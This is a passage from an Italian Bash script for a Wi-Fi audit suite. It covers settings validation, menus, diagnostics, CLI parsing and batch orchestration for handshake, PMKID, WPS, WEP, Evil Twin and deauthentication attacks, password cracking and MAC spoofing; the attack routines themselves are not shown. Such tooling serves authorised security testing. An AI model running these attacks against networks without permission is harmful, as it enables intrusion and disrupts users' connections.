    TARGET_BSSID) printf 'BSSID (-b): indirizzo MAC dell\047AP autorizzato; vuoto = scelta da scansione.' ;;
    TARGET_CHAN) printf 'Canale (-c): numero radio; vuoto = rilevamento nel batch.' ;;
    TARGET_ESSID) printf 'ESSID (-e): nome della rete; non sostituisce il BSSID.' ;;
    METHOD) printf 'Metodo batch (-m): all, hs, pmkid, wps, wep; vuoto = all.' ;;
    REPORT_HTML) printf 'Report finale (--report): yes/no; comprende solo questa sessione.' ;;
    WORDLIST) printf 'Wordlist: percorso assoluto al file di candidati, gia disponibile localmente.' ;;
    OUTDIR) printf 'Cartella risultati: percorso assoluto; modificabile prima di avviare la sessione.' ;;
    MON_IFACE) printf 'Interfaccia Wi-Fi: vuota = scelta automatica; modificabile prima della sessione.' ;;
    SCAN_TIME) printf 'Durata scansione in secondi; il timeout aggiunge 5 secondi.' ;;
    DEAUTH_COUNT) printf 'Numero di frame per invocazione deauth; puo interrompere le connessioni.' ;;
    DEAUTH_ROUNDS) printf 'Numero di tentativi del percorso handshake; non un limite di tutti i moduli.' ;;
    DEAUTH_WAIT) printf 'Attesa per tentativo in secondi; controllata a intervalli di 5 secondi.' ;;
    HASHCAT_MODE) printf 'Modalita hashcat di fallback; alcuni formati hanno riconoscimento per estensione.' ;;
    CRACK_ENGINE) printf 'Motore: auto, john, hashcat. Auto usa il rilevamento NVIDIA gia presente.' ;;
    JOHN_RULES) printf 'Nome regole John; none disattiva le regole nel percorso principale. Hashcat ha supporto parziale.' ;;
    JOHN_MODE) printf 'Modalita: wordlist, mask, incremental. Incremental e specifica di John.' ;;
    JOHN_MASK) printf 'Maschera John: pattern di candidati per la modalita mask.' ;;
    HC_MASK) printf 'Maschera hashcat: pattern di candidati per la modalita mask.' ;;
    JOHN_SESSION) printf 'Nome sessione John: lettere, cifre, trattino e underscore; alcuni percorsi usano nomi propri.' ;;
    GEN_WORDLIST) printf 'Wordlist da ESSID: auto/yes abilita, no disabilita la generazione mirata.' ;;
  esac
}
set_parameter(){
  local key="$1" value="$2"
  [[ "$value" != *$'\n'* && "$value" != *$'\r'* && "$value" != *$'\t'* ]] || { err "Non sono ammessi TAB o ritorni a capo"; return 1; }
  if [[ -n "$SESSION_ID" && ( "$key" == OUTDIR || "$key" == MON_IFACE ) ]]; then
    err "Parametro modificabile solo prima di avviare la sessione"; return 1
  fi
  case "$key" in
    TARGET_BSSID) [[ -z "$value" || "$value" =~ ^([[:xdigit:]]{2}:){5}[[:xdigit:]]{2}$ ]] || return 1 ;;
    TARGET_CHAN) [[ -z "$value" || "$value" =~ ^[1-9][0-9]{0,2}$ ]] || return 1 ;;
    TARGET_ESSID|JOHN_MASK|HC_MASK) ;;
    METHOD) [[ -z "$value" || "$value" =~ ^(all|hs|pmkid|wps|wep)$ ]] || return 1 ;;
    REPORT_HTML) [[ "$value" =~ ^(yes|no)$ ]] || return 1 ;;
    WORDLIST|OUTDIR|CONFIG_FILE) [[ "$value" == /* ]] || return 1 ;;
    MON_IFACE) [[ "$value" =~ ^[a-zA-Z0-9_.:-]*$ ]] || return 1 ;;
    SCAN_TIME|DEAUTH_COUNT|DEAUTH_ROUNDS|DEAUTH_WAIT|AUTO_SECONDS|AUTO_STEP_SECONDS) [[ "$value" =~ ^[1-9][0-9]{0,4}$ ]] || return 1 ;;
    HASHCAT_MODE) [[ "$value" =~ ^[0-9]{1,6}$ ]] || return 1 ;;
    CRACK_ENGINE) [[ "$value" =~ ^(auto|john|hashcat)$ ]] || return 1 ;;
    JOHN_MODE) [[ "$value" =~ ^(wordlist|mask|incremental)$ ]] || return 1 ;;
    AUTO_USE_MASK) [[ "$value" =~ ^(yes|no)$ ]] || return 1 ;;
    AUTO_INPUT) [[ -z "$value" || "$value" == /* ]] || return 1 ;;
    GEN_WORDLIST) [[ "$value" =~ ^(auto|yes|no)$ ]] || return 1 ;;
    JOHN_SESSION|JOHN_RULES) [[ "$value" =~ ^[a-zA-Z0-9_-]+$ ]] || return 1 ;;
    *) return 1 ;;
  esac
  printf -v "$key" '%s' "$value"
  if [[ "$key" == TARGET_BSSID ]]; then FP_ENC=""; FP_WPS=""; fi
}
edit_parameter(){
  local key="$1" value
  printf '\n%s\nValore attuale: %s\n' "$(setting_description "$key")" "${!key:-<vuoto>}"
  read -rp 'Nuovo valore (Invio = conserva, - = vuoto): ' value || return 1
  [[ -n "$value" ]] || return 0
  [[ "$value" != - ]] || value=""
  if set_parameter "$key" "$value"; then ok "Parametro aggiornato: $key"; else err "Valore rifiutato: parametro non modificato"; return 1; fi
}
# Controlla il percorso intero prima di scrivere configurazione come root.
trusted_directory(){
  local path perms owner
  path=$(readlink -f -- "$1") || return 1
  [[ -d "$path" ]] || return 1
  while :; do
    perms=$(stat -c '%a' -- "$path") || return 1
    owner=$(stat -c '%u' -- "$path") || return 1
    (( (8#$perms & 8#022) == 0 )) && [[ "$owner" == 0 || "$owner" == "$EUID" ]] || return 1
    [[ "$path" == / ]] && break
    path=$(dirname -- "$path")
  done
}
save_settings(){
  local parent existing temp key value
  [[ "$CONFIG_FILE" == /* && ! -L "$CONFIG_FILE" ]] || { err "Percorso config non valido"; return 1; }
  parent=$(dirname -- "$CONFIG_FILE"); existing="$parent"
  while [[ ! -e "$existing" ]]; do existing=$(dirname -- "$existing"); done
  trusted_directory "$existing" || { err "Directory config non fidata"; return 1; }
  ( umask 077; mkdir -p -m 700 -- "$parent" ) || return 1
  trusted_directory "$parent" || return 1
  [[ ! -e "$CONFIG_FILE" || ( -f "$CONFIG_FILE" && -O "$CONFIG_FILE" ) ]] || return 1
  temp=$(mktemp "$parent/.wifiaudit.conf.XXXXXX") || return 1
  {
    printf '# wifiaudit v5.5: configurazione dati, non codice shell\n'
    for key in "${CONFIG_KEYS[@]}"; do
      value="${!key}"
      # In sessione OUTDIR punta alla sottocartella temporanea: salva la radice.
      [[ "$key" != OUTDIR || -z "$SESSION_ID" ]] || value="$RESULTS_ROOT"
      # Non salvare il monitor creato automaticamente come scelta permanente.
      [[ "$key" != MON_IFACE || -z "$SESSION_ID" ]] || value="$STARTUP_MON_IFACE"
      printf '%s="%s"\n' "$key" "$value"
    done
  } > "$temp" || { rm -f -- "$temp"; return 1; }
  chmod 600 -- "$temp" && mv -f -- "$temp" "$CONFIG_FILE" || { rm -f -- "$temp"; return 1; }
  ok "Configurazione salvata: $CONFIG_FILE"
  info "Target e opzioni batch restano limitati alla sessione corrente."
}
settings_menu(){
  local choice i key
  while :; do
    printf '\nPARAMETRI - seleziona un numero per spiegazione e modifica\n'
    for i in "${!SETTING_KEYS[@]}"; do
      key="${SETTING_KEYS[$i]}"; printf '%2d) %-17s %s\n' "$((i+1))" "$key" "${!key:-<vuoto>}"
    done
    printf 's) Salva impostazioni  l) Carica config  0) Indietro\nConfig: %s\n' "$CONFIG_FILE"
    read -rp 'Scelta: ' choice || return 0
    case "$choice" in
      0) return 0 ;;
      s) save_settings || err "Salvataggio non riuscito" ;;
      l) safe_source "$CONFIG_FILE" && ok "Configurazione caricata" || err "Config assente o rifiutata" ;;
      *) if [[ "$choice" =~ ^[1-9][0-9]?$ ]] && (( choice <= ${#SETTING_KEYS[@]} )); then
           edit_parameter "${SETTING_KEYS[$((choice-1))]}" || true
         else warn "Scelta non valida"; fi ;;
    esac
  done
}
export_doctor(){
  local destination
  read -rp 'Percorso nuovo file diagnosi (Invio = annulla): ' destination || return 1
  [[ -n "$destination" ]] || return 0
  # FD aperto con noclobber: non modifica file esistenti o link simbolici.
  if (umask 077; set -C; exec 3> "$destination" || exit 2
      doctor >&3; diagnostic_status=$?
      (( diagnostic_status <= 1 ))); then
    ok "Diagnosi salvata: $destination"
  else err "Esportazione non riuscita (file esistente o percorso non scrivibile)"; return 1; fi
}
startup_menu(){
  local choice key
  while :; do
    printf '\nWIFIAUDIT v5.5 - AVVIO\n'
    printf '1) Suite interattiva: scansione e strumenti (richiede root)\n'
    printf '2) Batch guidato: target, metodo e report finale (richiede root)\n'
    printf '3) Parametri: visualizza spiegazioni e modifica le impostazioni\n'
    printf '4) Diagnostica locale: --doctor, nessuna modifica Wi-Fi\n'
    printf '5) Autoverifica: --self-test, nessun hardware richiesto\n'
    printf '6) Guida opzioni: --help\n7) Salva diagnostica in un file privato\n8) Recupero automatico da file (senza radio)\n0) Esci\n'
    read -rp 'Scelta: ' choice || return 0
    case "$choice" in
      1|2)
        if [[ $EUID -ne 0 ]]; then
          printf 'Per la suite completa riapri il menu con:\n  sudo bash %q --menu\n' "$SCRIPT_PATH"
          continue
        fi
        if [[ "$choice" == 2 ]]; then
          for key in TARGET_BSSID TARGET_CHAN TARGET_ESSID METHOD REPORT_HTML; do edit_parameter "$key" || true; done
          [[ -n "$TARGET_BSSID" ]] || { err "Il batch richiede un BSSID"; continue; }
          validate_args || continue
          return 11
        fi
        # Nella suite il target puo essere inserito prima o scelto da scansione.
        return 10 ;;
      3) settings_menu ;;
      4) doctor || true ;;
      5) self_test || true ;;
      6) usage ;;
      7) export_doctor || true ;;
      8) auto_wizard || true ;;
      0) return 0 ;;
      *) warn "Scelta non valida" ;;
    esac
  done
}

# ===================== MENU =======================================
menu(){
  banner
  echo -e "  target=${Y}${TARGET_ESSID:-nessuno}${N}  engine=${Y}$CRACK_ENGINE${N}  wordlist=${Y}$(basename -- "$WORDLIST")${N}"
  [[ -n "$LOG_FILE" ]] && echo -e "  log=${Y}$LOG_FILE${N}"
  # Mostra solo il contatore della sessione corrente.
  local pcount=0
  [[ -s "$PASSWORDS_FILE" ]] && pcount=$(wc -l < "$PASSWORDS_FILE")
  echo -e "  risultati sessione=${Y}$pcount${N} (in $PASSWORDS_FILE)"
  echo ""
  echo "  1) Scansiona reti                    (? = guida didattica)"
  echo "  2) Fingerprinting target (WPS/WPA3)"
  echo "  3) Attacco Handshake WPA/WPA2 + crack"
  echo "  4) Attacco PMKID (può generare traffico)"
  echo "  5) Attacco WPS / Pixie Dust"
  echo "  6) Attacco WEP (IVs + ARP replay)"
  echo "  7) Evil Twin (AP falso + deauth)"
  echo "  8) WPA-Enterprise (EAP capture)"
  echo "  9) Cracking manuale (cap / pcapng / 22000 / hash)"
  echo " 10) Maschere custom (pattern)"
  echo " 11) Wordlist mirata dall'SSID"
  echo " 12) Genera report HTML (con password)"
  echo " 13) Cambia MAC (anonimizza)"
  echo " 14) Recupero automatico da file (budget e riepilogo)"
  echo "  p) Tutti i parametri con spiegazione e salvataggio"
  echo "  d) Diagnostica    t) Autoverifica    h) Guida CLI"
  echo "  --- config ---"
  echo "  w) Wordlist   e) Engine   j) John mode/rules   c) conf   0) Esci"
  read -rp "  Scelta (? = guida): " ch || return 0
  case "$ch" in
    \?) help_scan; menu ;;
    h) usage; pause; menu ;;
    p) settings_menu; menu ;;
    d) doctor || true; pause; menu ;;
    t) self_test || true; pause; menu ;;
    1)  if scan_networks && choose_network; then pause; fi; menu ;;
    2)  need_target && fingerprint_ap; pause; menu ;;
    3)  need_target && attack_handshake; pause; menu ;;
    4)  need_target && attack_pmkid; pause; menu ;;
    5)  need_target && attack_wps; pause; menu ;;
    6)  need_target && attack_wep; pause; menu ;;
    7)  need_target && attack_eviltwin; pause; menu ;;
    8)  need_target && attack_enterprise; pause; menu ;;
    9)  crack_manual; pause; menu ;;
    10) read -rp "Maschera John [$JOHN_MASK]: " jm; [[ -n "$jm" ]] && JOHN_MASK="$jm"
        read -rp "Maschera hashcat [$HC_MASK]: " hm; [[ -n "$hm" ]] && HC_MASK="$hm"
        read -rp "File da crackare (cap/22000/hash): " f
        if [[ -f "$f" ]]; then
          if [[ "$f" == *.cap ]]; then
            cap_to_john "$f" "$OUTDIR/mask" && JOHN_MODE=mask crack_with_john "$OUTDIR/mask.john" mask
          else
            JOHN_MODE=mask crack_with_john "$f" mask
          fi
        else
          err "File non trovato"
        fi
        pause; menu ;;
    11) need_target && generate_target_wordlist "$TARGET_ESSID" >/dev/null; pause; menu ;;
    12) generate_html_report; pause; menu ;;
    13) change_mac "$MON_IFACE"; pause; menu ;;
    14) auto_wizard || true; pause; menu ;;
    w) edit_parameter WORDLIST || true; pause; menu ;;
    e) edit_parameter CRACK_ENGINE || true; pause; menu ;;
    j) edit_parameter JOHN_MODE || true; edit_parameter JOHN_RULES || true; pause; menu ;;
    c)  "${EDITOR:-nano}" "$CONFIG_FILE" || true
        safe_source "$CONFIG_FILE" || true; pause; menu ;;
    0)  exit 0 ;;
    *)  menu ;;
  esac
}

# ===================== DIAGNOSTICA LOCALE =========================
# Legge presenza binari e metadati pacchetti. Non esegue gli strumenti di audit.
doctor_tool(){
  local group="$1" binary="$2" package="$3" role="$4" location version="n/d"
  if location=$(type -P -- "$binary"); then
    if command -v dpkg-query &>/dev/null; then
      version=$(dpkg-query -W -f='${Version}' "$package" 2>/dev/null) || version="n/d"
      [[ -n "$version" ]] || version="n/d"
    fi
    printf '%-15s %-17s %-11s %-21s %s\n' "$group" "$binary" "PRESENTE" "$version" "$location"
    return 0
  fi
  printf '%-15s %-17s %-11s %-21s %s\n' "$group" "$binary" "ASSENTE" "—" "$role"
  [[ "$role" != richiesto ]]
}
doctor(){
  local missing=0 group binary package iface data driver row
  printf 'wifiaudit.sh v5.5 — Diagnostica locale\n'
  printf 'Bash: %s | Sistema: %s\n' "$BASH_VERSION" "$(uname -sr)"
  printf 'Nessuna scansione, installazione o modifica del sistema.\n\n'
  printf '%-15s %-17s %-11s %-21s %s\n' CATEGORIA COMANDO STATO VERSIONE_PACCHETTO PERCORSO_O_RUOLO
  while IFS='|' read -r group binary package; do
    doctor_tool "$group" "$binary" "$package" richiesto || missing=$((missing+1))
  done <<'TOOLS'
Acquisizione|airmon-ng|aircrack-ng
Acquisizione|airodump-ng|aircrack-ng
Acquisizione|aireplay-ng|aircrack-ng
Catture|aircrack-ng|aircrack-ng
Catture|wpaclean|aircrack-ng
Catture|hcxdumptool|hcxdumptool
Catture|hcxpcapngtool|hcxtools
Analisi|tshark|tshark
Recupero|john|john
Recupero|hashcat|hashcat
Wordlist|crunch|crunch
WPS|wash|reaver
WPS|reaver|reaver
AP_laboratorio|hostapd|hostapd
AP_laboratorio|dnsmasq|dnsmasq
Sistema|iptables|iptables
Sistema|macchanger|macchanger
Sistema|iw|iw
Sistema|ip|iproute2
Sistema|timeout|coreutils
Sistema|flock|util-linux
TOOLS
  printf '\nStrumenti facoltativi (rilevati, senza integrazione automatica):\n'
  doctor_tool Analisi wireshark wireshark facoltativo || true
  doctor_tool Analisi kismet kismet facoltativo || true
  doctor_tool Conversione wpapcap2john john facoltativo || true
  doctor_tool Conversione hccapx2john john facoltativo || true
  printf '\nInterfacce Wi-Fi locali (senza scansione):\n'
  if command -v iw &>/dev/null; then
    if data=$(iw dev 2>/dev/null); then
      if [[ "$data" == *Interface* ]]; then
        printf '%s\n' "$data" | awk '$1=="Interface" {print "  Interfaccia: "$2} $1=="type" {print "  Modalità: "$2}'
        while IFS= read -r iface; do
          [[ "$iface" =~ ^[a-zA-Z0-9_.:-]+$ ]] || continue
          driver=$(readlink -f "/sys/class/net/$iface/device/driver" 2>/dev/null) || driver=""
          [[ -z "$driver" ]] || printf '  Driver %s: %s\n' "$iface" "${driver##*/}"
        done < <(printf '%s\n' "$data" | awk '$1=="Interface" {print $2}')
      else
        printf '  Nessuna interfaccia wireless rilevata.\n'
      fi
    else
      printf '  Lettura non disponibile (permessi, driver o ambiente).\n'
    fi
  else
    printf '  Comando iw assente.\n'
  fi
  printf '\nWordlist predefinita: %s — ' "$WORDLIST"
  if [[ -r "$WORDLIST" ]]; then printf 'leggibile\n'; else printf 'assente o non leggibile\n'; fi
  printf 'Config: non caricata; nessuna impostazione della sessione applicata.\n'
  printf 'La presenza di un binario non garantisce versione, funzionalità o compatibilità hardware.\n'
  printf 'Dipendenze richieste mancanti: %d\n' "$missing"
  printf 'Per condividere questa diagnosi: bash wifiaudit.sh --doctor > diagnosi_wifi.txt\n'
  (( missing == 0 ))
}
self_test(){
  local failed=0 count=0 actual expected name
  while IFS='|' read -r name actual expected; do
    count=$((count+1))
    if [[ "$actual" == "$expected" ]]; then
      printf 'OK   %s\n' "$name"
    else
      printf 'FAIL %s\n' "$name"; failed=$((failed+1))
    fi
  done <<EOF
safe_name|$(safe_name 'rete /prova')|rete__prova
html_escape|$(html_escape '<a&b>')|&lt;a&amp;b&gt;
html_quotes|$(html_escape "\"'")|&quot;&#39;
tsv_tab|$(tsv_escape $'a\tb')|a\tb
tsv_newline|$(tsv_escape $'a\nb')|a\nb
hash_mode_22000|$(detect_hash_mode test.22000)|22000
hash_mode_hccapx|$(detect_hash_mode test.hccapx)|2500
hash_mode_john|$(detect_hash_mode test.john)|
EOF
  printf '%d controlli; %d errori. Nessuna operazione Wi-Fi eseguita.\n' "$count" "$failed"
  (( failed == 0 ))
}

# ===================== CLI ========================================
usage(){
  cat <<EOF
wifiaudit.sh v5.5 - Suite completa di audit Wi-Fi

USO:
  bash $0 --menu                 Menu iniziale (diagnostica senza root)
  sudo bash $0 --menu            Menu completo con privilegi root
  sudo $0 -b BSSID -c CHAN [-e ESSID] [-m METHOD] [--report]
  bash $0 --doctor               Diagnostica locale, senza root
  bash $0 --self-test            Autoverifica senza hardware
  bash $0 --help

OPZIONI BATCH:
  -b, --bssid   MAC         BSSID target
  -c, --chan    N           Canale
  -e, --essid   NAME        ESSID (default "batch")
  -m, --method  M           all | hs | pmkid | wps | wep
      --report              Genera report HTML a fine batch (con password)

OPZIONI GENERALI:
      --menu                Menu avvio, parametri, batch e diagnostica
      --doctor              Inventario locale; stato 1 se mancano dipendenze
      --self-test           Controlli delle funzioni pure; stato 1 su errore
      --auto-recover FILE   Recupero automatico offline da file
      --auto-seconds N      Budget globale, default 600 secondi
  -h, --help                Questa guida

--menu, --doctor e --self-test sono esclusivi: non accettano opzioni batch.

FILE DI OUTPUT:
  session_*/passwords.tsv     Risultati sessione (TSV, 7 colonne)
  passwords.tsv               Archivio cumulativo (non incluso nel report)
  \$OUTDIR/report_*.html      Report HTML generato

EOF
}

parse_args(){
  while (( $# > 0 )); do
    case "$1" in
      -h|--help) usage; exit 0 ;;
      --menu|--doctor|--self-test)
        [[ -z "$CLI_MODE" ]] || { err "Scegli una sola modalità diagnostica"; return 2; }
        CLI_MODE="$1"; shift ;;
      -b|--bssid)
        [[ -n "${2:-}" && "${2:-}" != -* ]] || { err "Manca il BSSID dopo $1"; exit 1; }
        TARGET_BSSID="$2"; shift 2 ;;
      -c|--chan)
        [[ -n "${2:-}" && "${2:-}" != -* ]] || { err "Manca il canale dopo $1"; exit 1; }
        TARGET_CHAN="$2"; shift 2 ;;
      -e|--essid)
        [[ -n "${2:-}" && "${2:-}" != -* ]] || { err "Manca ESSID dopo $1"; exit 1; }
        TARGET_ESSID="$2"; shift 2 ;;
      -m|--method)
        [[ -n "${2:-}" && "${2:-}" != -* ]] || { err "Manca metodo dopo $1"; exit 1; }
        METHOD="$2"; shift 2 ;;
      --auto-recover)
        [[ -n "${2:-}" && "${2:-}" != -* ]] || { err "Manca file"; return 2; }
        AUTO_INPUT="$2"; shift 2 ;;
      --auto-seconds)
        [[ "${2:-}" =~ ^[1-9][0-9]{0,4}$ ]] || { err "Budget non valido"; return 2; }
        AUTO_SECONDS="$2"; AUTO_SECONDS_CLI="$2"; shift 2 ;;
      --report)
        REPORT_HTML="yes"; shift ;;
      --) shift; (( $# == 0 )) || { err "Argomenti inattesi"; return 2; }; break ;;
      *) err "Opzione sconosciuta: $1"; return 2 ;;
    esac
  done
}

# ===================== MAIN =======================================
validate_args(){
  [[ -z "$TARGET_BSSID" || "$TARGET_BSSID" =~ ^([[:xdigit:]]{2}:){5}[[:xdigit:]]{2}$ ]] || { err "BSSID non valido"; return 2; }
  [[ -z "$TARGET_CHAN" || "$TARGET_CHAN" =~ ^[1-9][0-9]{0,2}$ ]] || { err "Canale non valido"; return 2; }
  [[ -z "$METHOD" || "$METHOD" =~ ^(all|hs|pmkid|wps|wep)$ ]] || { err "Metodo non valido"; return 2; }
  [[ -n "$TARGET_BSSID" || ( -z "$METHOD" && -z "$TARGET_CHAN" && "$REPORT_HTML" == no ) ]] || { err "Batch: specificare --bssid"; return 2; }
}
init_outputs(){
  RESULTS_ROOT="$OUTDIR"
  [[ ! -L "$RESULTS_ROOT" ]] || { err "Directory risultati simbolica rifiutata"; return 1; }
  mkdir -p -m 700 -- "$RESULTS_ROOT" || return 1
  local resolved path perms owner
  resolved=$(readlink -f -- "$RESULTS_ROOT") || return 1
  path="$resolved"
  while :; do
    perms=$(stat -c '%a' -- "$path") || return 1
    owner=$(stat -c '%u' -- "$path") || return 1
    (( (8#$perms & 8#022) == 0 )) && [[ "$owner" == 0 || "$owner" == "$EUID" ]] || { err "Percorso risultati non fidato: $path"; return 1; }
    [[ "$path" == / ]] && break
    path=$(dirname -- "$path")
  done
  RESULTS_ROOT="$resolved"
  chmod 700 -- "$RESULTS_ROOT" || return 1
  ARCHIVE_FILE="$RESULTS_ROOT/passwords.tsv"
  [[ ! -L "$ARCHIVE_FILE" && ( ! -e "$ARCHIVE_FILE" || ( -f "$ARCHIVE_FILE" && -O "$ARCHIVE_FILE" ) ) ]] || return 1
  touch -- "$ARCHIVE_FILE" && chmod 600 -- "$ARCHIVE_FILE" || return 1
  OUTDIR=$(mktemp -d "$RESULTS_ROOT/session_$(date +%Y%m%d_%H%M%S)_XXXXXX") || return 1
  SESSION_ID="wifiaudit-${OUTDIR##*/}"
  LOG_FILE="$OUTDIR/wifiaudit.log"; PASSWORDS_FILE="$OUTDIR/passwords.tsv"
  : > "$LOG_FILE"; : > "$PASSWORDS_FILE"
  info "Sessione: $OUTDIR"
}
main(){
  # Help e opzioni errate non leggono config e non modificano il sistema.
  parse_args "$@" || return $?
  validate_args || return $?
  if [[ -n "$AUTO_INPUT" ]]; then
    [[ -z "$CLI_MODE$TARGET_BSSID$TARGET_CHAN$TARGET_ESSID$METHOD" && "$REPORT_HTML" == no ]] || { err "Recupero offline incompatibile con opzioni radio/menu"; return 2; }
    if [[ -e "$CONFIG_FILE" ]]; then safe_source "$CONFIG_FILE" || return 2; fi
    [[ -z "$AUTO_SECONDS_CLI" ]] || AUTO_SECONDS="$AUTO_SECONDS_CLI"
    auto_recover "$AUTO_INPUT"; return $?
  fi
  [[ -z "$AUTO_SECONDS_CLI" ]] || { err "--auto-seconds richiede --auto-recover"; return 2; }
  if [[ -n "$CLI_MODE" ]]; then
    [[ $# == 1 ]] || { err "La diagnostica non accetta altre opzioni"; return 2; }
    case "$CLI_MODE" in
      --doctor) doctor; return $? ;;
      --self-test) self_test; return $? ;;
    esac
  fi
  local launch_action=11 config_loaded=0
  if (( $# == 0 )) || [[ "$CLI_MODE" == --menu ]]; then
    if [[ $EUID -eq 0 && -e "$CONFIG_FILE" ]]; then
      safe_source "$CONFIG_FILE" || { err "Config rifiutata"; return 1; }
      config_loaded=1
    fi
    startup_menu; launch_action=$?
    (( launch_action == 10 || launch_action == 11 )) || return "$launch_action"
    config_loaded=1
  fi
  [[ $EUID -eq 0 ]] || { err "Esegui come root: sudo bash $0 --menu"; return 1; }
  umask 077
  if (( ! config_loaded )) && [[ -e "$CONFIG_FILE" ]]; then safe_source "$CONFIG_FILE" || { err "Config rifiutata"; return 1; }; fi
  STARTUP_MON_IFACE="$MON_IFACE"
  init_outputs || return 1
  trap cleanup EXIT
  trap 'exit 130' INT
  trap 'exit 143' TERM
  trap 'exit 129' HUP
  check_deps || return 1
  setup_monitor || return 1
  [[ -f "$WORDLIST" ]] || warn "Wordlist assente: $WORDLIST"
  if [[ -n "$TARGET_BSSID" && "$launch_action" == 11 ]]; then
    TARGET_ESSID="${TARGET_ESSID:-batch}"
    if [[ -z "$TARGET_CHAN" ]]; then
      timeout 15 airodump-ng "$MON_IFACE" -w "$OUTDIR/batchscan" --output-format csv 2>>"$LOG_FILE" || true
      TARGET_CHAN=$(awk -F',' -v b="$TARGET_BSSID" 'tolower($1)==tolower(b) {gsub(/ /,"",$4); print $4; exit}' "$OUTDIR/batchscan-01.csv" 2>>"$LOG_FILE")
      [[ -n "$TARGET_CHAN" ]] || { err "BSSID non trovato"; return 1; }
      validate_args || return $?
    fi
    batch_mode "${METHOD:-all}" || return $?
    [[ "$REPORT_HTML" != yes ]] || generate_html_report
  else
    menu
  fi
}
if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then main "$@"; fi
